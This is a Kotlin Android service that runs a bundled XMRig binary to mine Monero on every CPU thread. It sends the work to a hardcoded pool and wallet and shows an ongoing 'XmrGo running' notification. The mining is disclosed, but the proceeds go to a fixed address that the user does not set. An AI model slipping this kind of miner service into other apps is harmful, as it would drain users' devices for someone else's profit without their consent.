package com.stonix.xmrgo

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import java.io.File

class MinerService : Service() {

    companion object {
        const val CHANNEL_ID = "miner"
        const val NOTIF_ID = 1

        const val POOL = "pool.hashvault.pro:443"
        const val WALLET =
            "4AxWM74d8eS2ZSidW8sSmxUtLH7tssuHcNRqSto7zP935x66eYi3DRFLDEYcPgCiuGJ4TiBgbPH5jiN1ARZYKJNEFkfJr3X"
        const val WORKER = "xmrGo"
    }

    private var proc: Process? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL_ID, "Miner", NotificationManager.IMPORTANCE_LOW)
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(
            NOTIF_ID,
            buildNotification("Mining started - ${Runtime.getRuntime().availableProcessors()} threads")
        )
        Thread { startMiner() }.start()
        return START_STICKY
    }

    private fun startMiner() {
        val xmrig = File(applicationInfo.nativeLibraryDir, "libxmrig.so")
        if (!xmrig.exists()) {
            TerminalBuffer.append("[!] xmrig binary not found at ${xmrig.path}\n")
            return
        }
        val threads = Runtime.getRuntime().availableProcessors()
        TerminalBuffer.append("[*] Starting XMRig on $threads threads\n")
        TerminalBuffer.append("[*] Pool: $POOL  Worker: $WORKER\n")

        val pb = ProcessBuilder(
            xmrig.absolutePath,
            "-o", POOL, "--tls",
            "-u", WALLET,
            "-p", WORKER,
            "-t", threads.toString(),
            "--donate-level=1",
            "--print-time=20",
            "--no-color"
        )
        pb.redirectErrorStream(true)
        try {
            proc = pb.start()
            proc!!.inputStream.bufferedReader().useLines { lines ->
                lines.forEach { TerminalBuffer.append(it + "\n") }
            }
        } catch (e: Exception) {
            TerminalBuffer.append("[!] Miner error: ${e.message}\n")
        }
        TerminalBuffer.append("[*] Miner exited.\n")
    }

    private fun buildNotification(text: String): Notification {
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("XmrGo running")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        proc?.destroy()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
